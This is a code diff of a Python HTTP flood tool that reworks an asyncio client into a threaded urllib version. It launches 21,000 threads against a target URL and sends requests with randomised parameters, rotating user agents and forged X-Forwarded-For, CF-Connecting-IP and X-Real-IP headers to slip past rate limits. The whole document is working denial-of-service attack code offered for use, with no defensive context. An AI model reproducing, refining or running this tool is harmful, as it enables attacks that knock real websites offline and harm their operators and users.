@@ -1,19 +1,23 @@
-import asyncio
-import httpx
+import sys
+import threading
 import random
 import re
 import ipaddress
+import time
 from datetime import datetime, timedelta
-import sys
+import urllib.request
+import urllib.error
 
 url = ''
 host = ''
 headers_useragents = []
 headers_referers = []
 request_counter = 0
-flag = False
+flag = 0
+threads = []
 
 isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
+real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
 
 def load_useragents():
     with open('useragents.txt', 'r') as f:
@@ -26,11 +30,15 @@ def load_referers():
 headers_useragents = load_useragents()
 headers_referers = load_referers()
 
-def generate_ip():
-    block = random.choice(isp_blocks)
+def generate_ip(block):
     network = ipaddress.ip_network(block, strict=False)
-    ip = ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1))
-    return str(ip)
+    return str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))
+
+def generate_spoofed_ip():
+    return generate_ip(random.choice(isp_blocks))
+
+def generate_real_ip():
+    return generate_ip(random.choice(isp_blocks))
 
 def generate_cookie():
     expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
@@ -39,48 +47,73 @@ def generate_cookie():
 def buildblock(size):
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
-async def httpcall(client):
+def inc_counter():
     global request_counter
-    spoofed_ip = generate_ip()
-    if url.count("?") > 0:
-        param_joiner = "&"
-    else:
-        param_joiner = "?"
-    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
+    request_counter += 1
+
+def stop_attack():
+    global flag
+    flag = 2
+
+def httpcall(url):
+    request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
-        'X-Forwarded-For': spoofed_ip,
+        'X-Forwarded-For': generate_spoofed_ip(),
         'Cookie': generate_cookie(),
-        'CF-Connecting-IP': spoofed_ip,
-        'X-Real-IP': spoofed_ip
+        'CF-Connecting-IP': generate_real_ip(),
+        'X-Real-IP': generate_real_ip(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Cache-Control': 'max-age=0',
+        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
     }
     try:
-        await client.get(request_url, headers=headers)
-        request_counter += 1
-    except:
+        req = urllib.request.Request(request_url, headers=headers)
+        urllib.request.urlopen(req)
+    except urllib.error.URLError:
         pass
+    else:
+        inc_counter()
 
-async def run_attack():
-    global flag
-    async with httpx.AsyncClient() as client:
-        while not flag:
-            tasks = [httpcall(client) for _ in range(5810)]
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(random.uniform(0.1, 0.5))
+class HTTPThread(threading.Thread):
+    def run(self):
+        while flag < 2:
+            httpcall(url)
+            time.sleep(random.uniform(0.1, 0.5))
+
+class MonitorThread(threading.Thread):
+    def run(self):
+        previous = request_counter
+        while flag == 0:
+            if previous + 1000 < request_counter and previous != request_counter:
+                print(f"{request_counter} Requests Sent")
+                previous = request_counter
+        if flag == 2:
+            print("\n-- Attack stopped by user --")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: script.py <url>")
         sys.exit()
-    else:
-        url = sys.argv[1]
-        if url.count("/") == 2:
-            url = url + "/"
-        m = re.search('(https?://)?([^/]*)/?.*', url)
-        host = m.group(2)
-        try:
-            asyncio.run(run_attack())
-        except KeyboardInterrupt:
-            flag = True
-            print("\n-- Attack stopped by user --")
+    url = sys.argv[1]
+    if url.count("/") == 2:
+        url += "/"
+    m = re.search('(https?://)?([^/]*)/?.*', url)
+    host = m.group(2)
+    for i in range(21000):
+        t = HTTPThread()
+        t.start()
+        threads.append(t)
+    monitor = MonitorThread()
+    monitor.start()
+    threads.append(monitor)
+    try:
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        stop_attack()
